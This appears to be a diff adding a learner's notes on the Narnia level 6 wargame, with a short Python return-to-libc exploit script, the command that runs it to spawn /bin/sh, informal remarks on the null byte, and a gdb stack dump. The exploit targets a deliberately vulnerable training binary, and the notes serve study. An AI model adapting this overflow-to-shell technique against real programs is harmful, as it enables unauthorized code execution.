@@ -1,0 +1,34 @@
+  1 import struct                                                                                                 
+  2  
+  3 bin_sh = "BBBB"
+  4  
+  5 padding = ""
+  6 padding = padding + "AAAA" * 2
+  7  
+  8 system = struct.pack("I",0xf7e4c850)
+  9  
+ 10 return_after_system = "AAAA"
+ 11  
+ 12  
+ 13  
+ 14 print padding + system + return_after_system + bin_sh
+
+
+./narnia6 $(python /tmp/tmp112/exploit.py) aaaaaaaa/bin/sh
+
+the key thing here is the null byte as you have to use the second input as after that it will have null byte
+if you just used one then the system() would read the wrong command
+
+not sure ab out this one
+
+r AAAAAAAAAA BBBBBBBB
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia6 AAAAAAAAAA BBBBBBBB
+
+Breakpoint 1, 0x080486e7 in main ()
+(gdb) x/100s $esp
+0xffffd688:     "\224\326\377\377BBBBBBBB"
+0xffffd695:     "AAAAAAAAA"
+
+not sure about the \224\326\377\377 but the second is lower in the stack
